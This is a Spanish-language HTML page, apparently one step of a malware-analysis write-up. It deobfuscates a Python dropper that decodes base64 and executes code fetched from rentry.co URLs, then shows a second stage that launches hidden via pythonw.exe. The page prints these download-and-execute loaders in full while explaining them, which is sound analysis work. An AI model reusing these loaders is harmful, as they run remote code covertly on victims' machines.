<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Aislamiento del codigo encriptado</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>

<body>
  <div class="page">
    <h1 class="title">Aislamiento del codigo encriptado</h1>

    <div class="content-block">
      <div class="highlight-code">Aquí vamos a extraer y analizar el código malicioso del script</div>

      <pre
        class="codebox"><code class="highlight-code">;import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp').decode())</code></pre>

      <div class="highlight-code">Algunas personas que no saben mucho sobre Python tal vez no estén al tanto de que
        Python no requiere el uso obligatorio de punto y coma. Sin embargo, este código es completamente válido en
        Python, donde puedes insertar una cantidad exagerada de espacios, dos puntos o punto y coma, y esto puede hacer
        que el código sea difícil de entender o descubrir.</div>

      <div class="highlight-code">Formateamos el código.</div>

      <pre
        class="codebox"><code class="highlight-code">import os
os.system('pip install requests')
import requests
import base64
exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp').decode())</code></pre>

      <div class="highlight-code">Vamos a necesitar instalar esas dependencias para poder continuar.</div>

      <pre class="codebox"><code class="highlight-code">pip install requests base64</code></pre>

      <div class="highlight-code">Modificamos y ejecutamos</div>

      <pre
        class="codebox"><code class="highlight-code">import requests
import base64
print(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmVudHJ5LmNvLzltdHBkZWR0L3JhdyIpLnRleHQp').decode())</code></pre>

      <div class="image-container">
        <img src="images/4-1.png" alt="Código ejecutado" class="tech-image">
      </div>

      <div class="highlight-code">Vemos lo que hay detrás</div>

      <div class="highlight-code">Basicamente hace un request get a esa url donde hay un código que introduce en un txt.
      </div>

      <div class="highlight-code">Veamos el código</div>

      <pre class="codebox"><code class="highlight-code">from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://rentry.co/6uh8vuwz/raw").read())""")
_ttmp.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except: pass</code></pre>

      <div class="tech-explanation">
        <div class="highlight-code">• NamedTemporaryFile de tempfile (como _ffile): Crea un archivo temporal en el
          sistema.</div>
        <div class="highlight-code">• executable de sys (como _eexecutable): Obtiene la ruta del ejecutable de Python
          que se está utilizando.</div>
        <div class="highlight-code">• system de os (como _ssystem): Ejecuta comandos del sistema operativo.</div>
      </div>

      <div class="explanation-block">
        <div class="highlight-code">Se crea un archivo temporal mediante NamedTemporaryFile, que no será eliminado
          automáticamente (delete=False).</div>
        <div class="highlight-code">Usa urlopen de urllib.request para descargar y ejecutar código desde la URL
          https://rentry.co/6uh8vuwz/raw usando la función exec. Es decir, descarga el contenido en esa URL y lo ejecuta
          como código Python.</div>
        <div class="highlight-code">Luego, intenta ejecutar dicho archivo utilizando pythonw.exe (una versión de Python
          que no muestra la ventana de consola).</div>
        <div class="highlight-code">Es un ejemplo clásico de un descargador de código remoto, comúnmente utilizado en
          scripts maliciosos o automatización remota.</div>
        <div class="highlight-code">Veamos el nuevo código que intenta ejecutar en el siguiente punto.</div>
      </div>
    </div>
  </div>
</body>

</html>